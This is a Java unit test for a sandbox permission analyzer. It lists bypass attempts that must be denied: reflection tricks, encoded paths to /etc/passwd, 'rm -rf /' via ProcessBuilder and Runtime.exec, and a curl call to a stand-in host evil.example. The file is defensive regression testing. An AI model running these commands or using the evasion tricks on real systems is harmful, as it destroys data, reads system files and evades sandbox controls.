package ai.nooa.runtime.sandbox;

import ai.nooa.security.Permissions;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

import java.util.List;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * Stage 5 regression corpus: each named bypass attempt must be denied by the
 * sandbox permission gate. These lock in the adversarial cases the hardening
 * work targets so a future refactor cannot silently reopen them.
 */
@DisplayName("permission bypass corpus (Stage 5)")
class PermissionBypassCorpusTest {

    private record Bypass(String name, String code) {}

    private static final List<Bypass> CORPUS = List.of(
        new Bypass("string concat class name",
            "Class.forName(\"java.io.\" + \"File\");"),
        new Bypass("reflection getDeclaredConstructor",
            "java.lang.ProcessBuilder.class.getDeclaredConstructor(String.class);"),
        new Bypass("reflection getDeclaredField",
            "String.class.getDeclaredField(\"value\");"),
        new Bypass("wildcard import aliasing",
            "import java.nio.file.*;"),
        new Bypass("simple-name file access",
            "Files.readString(Path.of(\"/etc/passwd\"));"),
        new Bypass("qualified file access",
            "new java.io.File(\"/etc/passwd\");"),
        new Bypass("process builder literal",
            "new ProcessBuilder(\"rm\", \"-rf\", \"/\");"),
        new Bypass("runtime exec literal",
            "Runtime.getRuntime().exec(\"curl http://evil.example\");"),
        new Bypass("exec with array literal",
            "Runtime.getRuntime().exec(new String[]{\"rm\", \"-rf\", \"/\"});"),
        new Bypass("non-literal file path",
            "Files.readString(Path.of(target));"),
        new Bypass("base64-encoded path",
            "Files.readString(Path.of(new String(java.util.Base64.getDecoder()"
                + ".decode(\"L2V0Yy9wYXNzd2Q=\"))));"),
        new Bypass("hex-encoded path",
            "new java.io.File(new String(new byte[]{47, 101, 116, 99}));"));

    @Test
    @DisplayName("every bypass attempt is denied")
    void everyBypassIsDenied() {
        Permissions denyAll = new Permissions();
        for (Bypass bypass : CORPUS) {
            var decision = CodePermissionAnalyzer.analyze(bypass.code(), denyAll, null);
            assertThat(decision.allowed())
                .as("expected DENY for '%s': %s", bypass.name(), bypass.code())
                .isFalse();
        }
    }
}
